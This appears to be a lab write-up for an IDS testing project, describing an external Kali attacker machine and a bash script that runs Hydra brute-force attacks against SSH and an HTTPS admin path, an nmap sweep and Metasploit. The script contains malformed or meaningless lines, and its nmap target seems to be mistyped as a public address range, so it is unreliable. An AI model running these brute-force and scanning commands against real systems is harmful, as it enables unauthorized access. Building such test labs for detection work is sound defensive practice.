Attacker Machines
====
We chose to have two machines acting as attackers on our network, one external and a internal compromised Windows host.

Kali Outside Attacker Machine
----
We chose to use Kali Linux as our external attacker machine, Kali was chosen due to its existing robust catalouge of hacking tools.
We chose to use the following to simulate an attack: 

- NMAP (Scanning Ports)
- HYDRA (Brute Force Password)
- WMAP / Metasploit (Scanning DVWA)

I wrote a custom script to automate most of this process.
    
    .. code-block:: bash

        #/bin/bash
        root -i
        echo "======================================"
        cowsay Moooo!
        echo "Proj: IDS"
        echo "Purpose: Test IDS Rules and Logging with a variety of attacks"
        echo "#################################"
        hydra -L name -P a 10.180.110.253 https-head /admin/dm-launcher.msi -v -I
        hydra -L name -P a 10.180.110.250 ssh -t 4
        echo "DONE: Hydra on Admin ASDM Download to find privlaged users"
        echo "#############################"
        ssh user1@10.180.110.250 'exit'
        echo "DONE: Sample remote ssh via attempted brute force"
        echo "###########################"
        #cowsay Hackermode
        sudo nmap -v  110.180.110.0/24
        msfconsole 'load'
        echo "DONE: WEB APP EXPLOITS"
        #cowsay MOO!
        echo "==================================="
        eof

This script launches a hydra attack on the specified IP addresses, then runs a nmap scan and then opens the metasploit console


   
